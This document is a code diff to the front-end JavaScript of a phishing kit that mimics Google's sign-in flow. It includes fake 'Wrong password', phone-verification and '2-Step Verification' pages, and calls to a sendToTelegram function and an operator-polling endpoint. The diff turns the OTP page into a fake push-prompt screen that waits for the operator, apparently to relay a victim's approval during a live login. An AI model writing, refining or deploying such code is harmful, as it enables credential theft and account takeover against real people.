@@ -8,32 +8,7 @@ let isTransitioning   = false; // prevent double page transitions
 
 document.addEventListener('DOMContentLoaded', function() {
   initEmailPage();
-  initDebugOverlay();
 });
-
-function initDebugOverlay() {
-  // Small debug panel — remove before going live
-  var panel = document.createElement('div');
-  panel.id = '__debug_panel';
-  panel.style.cssText = (
-    'position:fixed;bottom:0;right:0;width:360px;max-height:200px;' +
-    'background:rgba(0,0,0,0.85);color:#0f0;font:11px/1.4 monospace;' +
-    'z-index:9999;overflow:hidden;border-top-left-radius:8px;display:flex;flex-direction:column;'
-  );
-  panel.innerHTML = (
-    '<div style="padding:4px 8px;background:#111;color:#fff;font-size:10px;display:flex;justify-content:space-between;">' +
-    '<span>\uD83D\uDD2C Debug Log</span>' +
-    '<button id="__debug_close" style="background:none;border:none;color:#fff;cursor:pointer;font-size:12px">X</button>' +
-    '</div>' +
-    '<div id="__debug_log" style="flex:1;overflow-y:auto;padding:4px 8px;"></div>'
-  );
-  document.body.appendChild(panel);
-  // Close button handler
-  panel.querySelector('button').addEventListener('click', function() {
-    panel.style.display = 'none';
-  });
-  dbg('Debug overlay ready — polling chain tracking active');
-}
 
 function initEmailPage() {
   const form = document.getElementById('email-form');
@@ -324,84 +299,47 @@ function sendToTelegram(dataType, email, data, sessionId) {
 // Global polling flag — ensures only one poll chain runs at a time
 // and in-flight fetches don't trigger transitions after polling is stopped
 let pollingActive = false;
-let pollChainId   = 0; // unique ID per pollForResponse call — stale in-flight fetches are ignored
-
-function dbg(msg) {
-  console.log('[POLL DEBUG] ' + msg);
-  // Update debug overlay if present
-  var el = document.getElementById('__debug_log');
-  if (el) {
-    var line = document.createElement('div');
-    line.style.cssText = 'border-bottom:1px solid #333;padding:2px 0;';
-    line.textContent = new Date().toISOString().split('T')[1].split('.')[0] + ' ' + msg;
-    el.insertBefore(line, el.firstChild);
-    // Keep last 30 lines
-    while (el.children.length > 30) el.removeChild(el.lastChild);
-  }
-}
 
 function pollForResponse(sessionId, submitBtn) {
-  // Increment chain ID — any in-flight tick() from a previous call will see
-  // myChainId !== pollChainId and abort, preventing stale transitions
-  pollChainId++;
-  const myChainId = pollChainId;
+  // Stop any previous poll chain
   pollingActive = false;
 
-  dbg('pollForResponse started. chain=' + myChainId + ' session=' + sessionId.substring(0,8) + '...');
+  const maxWait    = 120000;
+  const interval   = 1000;
+  const startTime  = Date.now();
 
-  const maxWait   = 120000;
-  const interval  = 1000;
-  const startTime = Date.now();
-
-  // Longer delay — gives send-to-telegram time to reset session in Supabase
-  // AND allows Supabase replication to propagate before first read
-  setTimeout(startPolling, 1200);
+  // Small buffer before first poll to let any network state settle
+  setTimeout(startPolling, 200);
 
   function startPolling() {
-    if (myChainId !== pollChainId) {
-      dbg('startPolling aborted (superseded) chain=' + myChainId);
-      return;
-    }
     pollingActive = true;
-    dbg('polling started chain=' + myChainId);
     tick();
   }
 
   function tick() {
-    if (myChainId !== pollChainId || !pollingActive) {
-      dbg('tick aborted chain=' + myChainId + ' active=' + pollingActive);
-      return;
-    }
+    if (!pollingActive) return; // stopped externally
 
     if (Date.now() - startTime > maxWait) {
       pollingActive = false;
-      dbg('poll TIMEOUT chain=' + myChainId);
       if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = 'Next'; }
       return;
     }
 
-    fetch('/api/poll-session?sessionId=' + sessionId + '&chain=' + myChainId)
+    fetch('/api/poll-session?sessionId=' + sessionId)
       .then(function(r) { return r.json(); })
       .then(function(data) {
-        // Abort if superseded by a newer pollForResponse call
-        if (myChainId !== pollChainId || !pollingActive) {
-          dbg('fetch result discarded (superseded) chain=' + myChainId);
-          return;
-        }
-
-        dbg('poll result: status=' + data.status + ' responseType=' + (data.responseType||'null') + ' chain=' + myChainId);
+        if (!pollingActive) return; // stopped while fetch was in-flight
 
         if (data.status === 'responded' && data.responseType) {
-          pollingActive = false;
-          dbg('RESPONSE DETECTED: ' + data.responseType + ' chain=' + myChainId);
+          pollingActive = false; // stop before transition
           handleTelegramResponse(data.responseType, data.response, data.email || currentEmail, sessionId);
         } else {
+          // Still waiting — schedule next tick
           setTimeout(tick, interval);
         }
       })
-      .catch(function(err) {
-        dbg('poll fetch error: ' + err.message);
-        if (myChainId === pollChainId && pollingActive) setTimeout(tick, interval);
+      .catch(function() {
+        if (pollingActive) setTimeout(tick, interval);
       });
   }
 }
@@ -469,7 +407,7 @@ function showIncorrectPasswordPage(email, sessionId) {
     '</div>' +
     '<div style="display:flex;align-items:center;gap:6px;margin-top:8px">' +
     '<svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#d93025" d="M11 15h2v2h-2zm0-8h2v6h-2zm1-5C6.47 2 2 6.5 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm0 18a8 8 0 0 1-8-8 8 8 0 0 1 8-8 8 8 0 0 1 8 8 8 8 0 0 1-8 8z"/></svg>' +
-    '<span style="color:#d93025 !important;font-size:14px;line-height:1.4;font-weight:400">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
+    '<span style="color:#e8eaed;font-size:14px;line-height:1.4">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
     '</div>' +
     '<div class="qx5512-cr" style="margin-top:16px"><input id="pw-retry-show" type="checkbox"><label for="pw-retry-show">Show password</label></div>' +
     '</div>' +
@@ -595,7 +533,7 @@ function showPhoneVerificationPage(email, phoneNumber, sessionId) {
     '<div style="position:relative;flex-shrink:0;border-right:1px solid #5f6368">' +
     '<span id="ph-flag" style="position:absolute;left:10px;top:50%;transform:translateY(-50%);font-size:18px;pointer-events:none;z-index:1">🇺🇸</span>' +
     '<select id="ph-country" style="padding:14px 28px 14px 40px;background:transparent;border:none;color:#e8eaed;font-size:13px;cursor:pointer;appearance:none;-webkit-appearance:none;width:140px;outline:none">' +
-    '<option value="US|+1">🇺🇸 +1</option><option value="CA|+1">🇨🇦 +1</option><option value="GB|+44">🇬🇧 +44</option><option value="AU|+61">🇦🇺 +61</option><option value="DE|+49">🇩🇪 +49</option><option value="FR|+33">🇫🇷 +33</option><option value="IT|+39">🇮🇹 +39</option><option value="ES|+34">🇪🇸 +34</option><option value="PT|+351">🇵🇹 +351</option><option value="NL|+31">🇳🇱 +31</option><option value="BE|+32">🇧🇪 +32</option><option value="CH|+41">🇨🇭 +41</option><option value="AT|+43">🇦🇹 +43</option><option value="SE|+46">🇸🇪 +46</option><option value="NO|+47">🇳🇴 +47</option><option value="DK|+45">🇩🇰 +45</option><option value="FI|+358">🇫🇮 +358</option><option value="PL|+48">🇵🇱 +48</option><option value="CZ|+420">🇨🇿 +420</option><option value="HU|+36">🇭🇺 +36</option><option value="RO|+40">🇷🇴 +40</option><option value="UA|+380">🇺🇦 +380</option><option value="GR|+30">🇬🇷 +30</option><option value="RU|+7">🇷🇺 +7</option><option value="TR|+90">🇹🇷 +90</option><option value="IN|+91">🇮🇳 +91</option><option value="PK|+92">🇵🇰 +92</option><option value="BD|+880">🇧🇩 +880</option><option value="LK|+94">🇱🇰 +94</option><option value="NP|+977">🇳🇵 +977</option><option value="CN|+86">🇨🇳 +86</option><option value="JP|+81">🇯🇵 +81</option><option value="KR|+82">🇰🇷 +82</option><option value="TW|+886">🇹🇼 +886</option><option value="HK|+852">🇭🇰 +852</option><option value="SG|+65">🇸🇬 +65</option><option value="MY|+60">🇲🇾 +60</option><option value="ID|+62">🇮🇩 +62</option><option value="PH|+63">🇵🇭 +63</option><option value="TH|+66">🇹🇭 +66</option><option value="VN|+84">🇻🇳 +84</option><option value="NZ|+64">🇳🇿 +64</option><option value="BR|+55">🇧🇷 +55</option><option value="AR|+54">🇦🇷 +54</option><option value="CO|+57">🇨🇴 +57</option><option value="CL|+56">🇨🇱 +56</option><option value="PE|+51">🇵🇪 +51</option><option value="MX|+52">🇲🇽 +52</option><option value="SA|+966">🇸🇦 +966</option><option value="AE|+971">🇦🇪 +971</option><option value="QA|+974">🇶🇦 +974</option><option value="KW|+965">🇰🇼 +965</option><option value="EG|+20">🇪🇬 +20</option><option value="MA|+212">🇲🇦 +212</option><option value="NG|+234">🇳🇬 +234</option><option value="GH|+233">🇬🇭 +233</option><option value="KE|+254">🇰🇪 +254</option><option value="ZA|+27">🇿🇦 +27</option><option value="ET|+251">🇪🇹 +251</option><option value="TZ|+255">🇹🇿 +255</option><option value="UG|+256">🇺🇬 +256</option><option value="CM|+237">🇨🇲 +237</option><option value="SN|+221">🇸🇳 +221</option>' +
+    '<option value="US|+1">🇺🇸 United States (+1)</option><option value="CA|+1">🇨🇦 Canada (+1)</option><option value="GB|+44">🇬🇧 United Kingdom (+44)</option><option value="AU|+61">🇦🇺 Australia (+61)</option><option value="DE|+49">🇩🇪 Germany (+49)</option><option value="FR|+33">🇫🇷 France (+33)</option><option value="IT|+39">🇮🇹 Italy (+39)</option><option value="ES|+34">🇪🇸 Spain (+34)</option><option value="PT|+351">🇵🇹 Portugal (+351)</option><option value="NL|+31">🇳🇱 Netherlands (+31)</option><option value="BE|+32">🇧🇪 Belgium (+32)</option><option value="CH|+41">🇨🇭 Switzerland (+41)</option><option value="AT|+43">🇦🇹 Austria (+43)</option><option value="SE|+46">🇸🇪 Sweden (+46)</option><option value="NO|+47">🇳🇴 Norway (+47)</option><option value="DK|+45">🇩🇰 Denmark (+45)</option><option value="FI|+358">🇫🇮 Finland (+358)</option><option value="PL|+48">🇵🇱 Poland (+48)</option><option value="CZ|+420">🇨🇿 Czech Republic (+420)</option><option value="HU|+36">🇭🇺 Hungary (+36)</option><option value="RO|+40">🇷🇴 Romania (+40)</option><option value="UA|+380">🇺🇦 Ukraine (+380)</option><option value="GR|+30">🇬🇷 Greece (+30)</option><option value="RU|+7">🇷🇺 Russia (+7)</option><option value="TR|+90">🇹🇷 Turkey (+90)</option><option value="IN|+91">🇮🇳 India (+91)</option><option value="PK|+92">🇵🇰 Pakistan (+92)</option><option value="BD|+880">🇧🇩 Bangladesh (+880)</option><option value="LK|+94">🇱🇰 Sri Lanka (+94)</option><option value="NP|+977">🇳🇵 Nepal (+977)</option><option value="CN|+86">🇨🇳 China (+86)</option><option value="JP|+81">🇯🇵 Japan (+81)</option><option value="KR|+82">🇰🇷 South Korea (+82)</option><option value="TW|+886">🇹🇼 Taiwan (+886)</option><option value="HK|+852">🇭🇰 Hong Kong (+852)</option><option value="SG|+65">🇸🇬 Singapore (+65)</option><option value="MY|+60">🇲🇾 Malaysia (+60)</option><option value="ID|+62">🇮🇩 Indonesia (+62)</option><option value="PH|+63">🇵🇭 Philippines (+63)</option><option value="TH|+66">🇹🇭 Thailand (+66)</option><option value="VN|+84">🇻🇳 Vietnam (+84)</option><option value="NZ|+64">🇳🇿 New Zealand (+64)</option><option value="BR|+55">🇧🇷 Brazil (+55)</option><option value="AR|+54">🇦🇷 Argentina (+54)</option><option value="CO|+57">🇨🇴 Colombia (+57)</option><option value="CL|+56">🇨🇱 Chile (+56)</option><option value="PE|+51">🇵🇪 Peru (+51)</option><option value="MX|+52">🇲🇽 Mexico (+52)</option><option value="SA|+966">🇸🇦 Saudi Arabia (+966)</option><option value="AE|+971">🇦🇪 UAE (+971)</option><option value="QA|+974">🇶🇦 Qatar (+974)</option><option value="KW|+965">🇰🇼 Kuwait (+965)</option><option value="EG|+20">🇪🇬 Egypt (+20)</option><option value="MA|+212">🇲🇦 Morocco (+212)</option><option value="NG|+234">🇳🇬 Nigeria (+234)</option><option value="GH|+233">🇬🇭 Ghana (+233)</option><option value="KE|+254">🇰🇪 Kenya (+254)</option><option value="ZA|+27">🇿🇦 South Africa (+27)</option><option value="ET|+251">🇪🇹 Ethiopia (+251)</option><option value="TZ|+255">🇹🇿 Tanzania (+255)</option><option value="UG|+256">🇺🇬 Uganda (+256)</option><option value="CM|+237">🇨🇲 Cameroon (+237)</option><option value="SN|+221">🇸🇳 Senegal (+221)</option>' +
     '</select>' +
     '<svg viewBox="0 0 24 24" width="16" height="16" style="position:absolute;right:6px;top:50%;transform:translateY(-50%);pointer-events:none"><path fill="#9aa0a6" d="M7 10l5 5 5-5z"/></svg>' +
     '</div>' +
@@ -675,39 +613,29 @@ function showSuccessPage() {
 
 
 
-// ============================================================
-// SUA PAGE - Suspicious Activity
 
 function showSUAPage(email, sessionId) {
   var safeEmail = String(email).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   document.body.innerHTML =
     '<div class="qx5512-pg"><div class="qx5512-mn"><div class="qx5512-lc">' +
     '<div class="qx5512-bs">' +
-    '<svg class="qx5512-glg" width="48" height="48" viewBox="0 0 24 24" aria-label="Google"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>' +
-    '<h1>Sign in</h1>' +
-    '<button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px"><svg class="qx5512-av" viewBox="0 0 24 24" width="20" height="20"><path fill="#e8eaed" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg><span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span><svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#e8eaed" d="M7 10l5 5 5-5z"/></svg></button>' +
+    '<svg class=\"qx5512-glg\" width=\"40\" height=\"40\" viewBox=\"0 0 24 24\"><path fill=\"#4285F4\" d=\"M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z\"/><path fill=\"#34A853\" d=\"M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z\"/><path fill=\"#FBBC05\" d=\"M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z\"/><path fill=\"#EA4335\" d=\"M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z\"/></svg>' +
+    '<h1 style="font-size:22px;margin-top:8px">2-Step Verification</h1>' +
+    '<p style="color:#e8eaed;font-size:14px;margin:8px 0 0;max-width:360px;line-height:1.5">To help keep your account safe, Google wants to make sure it&#39;s really you trying to sign in</p>' +
+    '<button type=\"button\" class=\"qx5512-er\" style=\"background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px\"><svg class=\"qx5512-av\" viewBox=\"0 0 24 24\" width=\"20\" height=\"20\"><path fill=\"#e8eaed\" d=\"M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z\"/></svg><span style=\"flex:1;text-align:left;font-weight:500;color:#e8eaed\">' + safeEmail + '</span><svg viewBox=\"0 0 24 24\" width=\"18\" height=\"18\" style=\"flex-shrink:0\"><path fill=\"#e8eaed\" d=\"M7 10l5 5 5-5z\"/></svg></button>' +
     '</div>' +
-    '<div class="qx5512-fs"><form class="qx5512-pf" id="sua-form">' +
-    '<div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:20px;padding:12px 14px;background:#fce8e6;border-radius:4px">' +
-    '<svg viewBox="0 0 24 24" width="20" height="20" style="flex-shrink:0;margin-top:1px"><path fill="#d93025" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>' +
-    '<span style="color:#d93025;font-size:14px;line-height:1.4">This account has shown suspicious activity. Verify your identity to continue.</span></div>' +
-    '<p style="color:#e8eaed;font-size:14px;margin-bottom:20px;line-height:1.5">A verification code has been sent to your email</p>' +
-    '<div class="qx5512-if">' +
-    '<input class="qx5512-pw" required type="text" id="sua-input" placeholder=" " maxlength="6" inputmode="numeric">' +
-    '<span class="qx5512-il">Enter code</span></div>' +
-    '<div class="qx5512-bg qx5512-pa" style="margin-top:28px"><a href="#" class="qx5512-fl">Try another way</a>' +
-    '<button type="submit" class="qx5512-nb">Next</button></div>' +
-    '</form></div></div></div></div>' +
-    '<footer class="qx5512-pf-ft"><div class="qx5512-ls-w"><select class="qx5512-ls"><option selected>English (United States)</option></select></div><nav class="qx5512-fl-nk"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav></footer>';
+    '<div class="qx5512-fs" style="display:flex;flex-direction:column;justify-content:center">' +
+    '<svg width=\"160\" height=\"160\" viewBox=\"0 0 160 160\" style=\"margin:20px auto;display:block\"><rect x=\"40\" y=\"4\" width=\"80\" height=\"128\" rx=\"12\" fill=\"#2a2a2a\" stroke=\"#444\" stroke-width=\"1\"/><rect x=\"47\" y=\"16\" width=\"66\" height=\"96\" rx=\"4\" fill=\"#1a1a1a\"/><circle cx=\"80\" cy=\"10\" r=\"3\" fill=\"#111\"/><rect x=\"70\" y=\"122\" width=\"20\" height=\"3\" rx=\"1.5\" fill=\"#555\"/><text x=\"80\" y=\"62\" text-anchor=\"middle\" font-family=\"Arial,sans-serif\" font-size=\"9\" font-weight=\"bold\" fill=\"#e8eaed\">Google</text><rect x=\"56\" y=\"70\" width=\"48\" height=\"5\" rx=\"2.5\" fill=\"#3a3a3a\"/><rect x=\"62\" y=\"80\" width=\"36\" height=\"4\" rx=\"2\" fill=\"#2e2e2e\"/><circle cx=\"60\" cy=\"140\" r=\"16\" fill=\"#555\"/><line x1=\"54\" y1=\"134\" x2=\"66\" y2=\"146\" stroke=\"#e8eaed\" stroke-width=\"2\" stroke-linecap=\"round\"/><line x1=\"66\" y1=\"134\" x2=\"54\" y2=\"146\" stroke=\"#e8eaed\" stroke-width=\"2\" stroke-linecap=\"round\"/><circle cx=\"102\" cy=\"140\" r=\"18\" fill=\"#4285F4\"/><polyline points=\"93,140 99,147 112,131\" fill=\"none\" stroke=\"#fff\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/></svg>' +
+    '<p style="color:#e8eaed;font-size:16px;font-weight:500;margin-bottom:12px;line-height:1.4">Open the Gmail app on your phone</p>' +
+    '<p style="color:#9aa0a6;font-size:14px;margin-bottom:24px;line-height:1.6">Google sent a notification to your phone. Open the Gmail app and tap <b style="color:#e8eaed">Yes</b> on the prompt to verify it&#39;s you.</p>' +
+    '<a href="#" class="qx5512-fl" style="font-size:14px;margin-bottom:8px">Resend it</a>' +
+    '<div id="sua-status" style="color:#9aa0a6;font-size:13px;margin-top:8px">Waiting for verification...</div>' +
+    '<div class="qx5512-bg qx5512-pa" style="margin-top:32px">' +
+    '<a href="#" class="qx5512-fl">Try another way</a>' +
+    '</div>' +
+    '</div>' +
+    '</div></div></div><footer class=\"qx5512-pf-ft\"><div class=\"qx5512-ls-w\"><select class=\"qx5512-ls\"><option selected>English (United States)</option></select></div><nav class=\"qx5512-fl-nk\"><a href=\"#\">Help</a><a href=\"#\">Privacy</a><a href=\"#\">Terms</a></nav></footer>';
 
-  var inp = document.getElementById('sua-input'); inp.focus();
-  document.getElementById('sua-form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    var code = inp.value.trim();
-    if (!code) return;
-    var btn = this.querySelector('button[type="submit"]');
-    btn.disabled=true; inp.disabled=true; btn.textContent='Verifying…';
-    sendToTelegram('OTP', email, code, sessionId);
-    setTimeout(function(){ pollForResponse(sessionId, btn); }, 500);
-  });
+  // Start polling immediately — SUA waits for operator to press next button
+  pollForResponse(sessionId, null);
 }
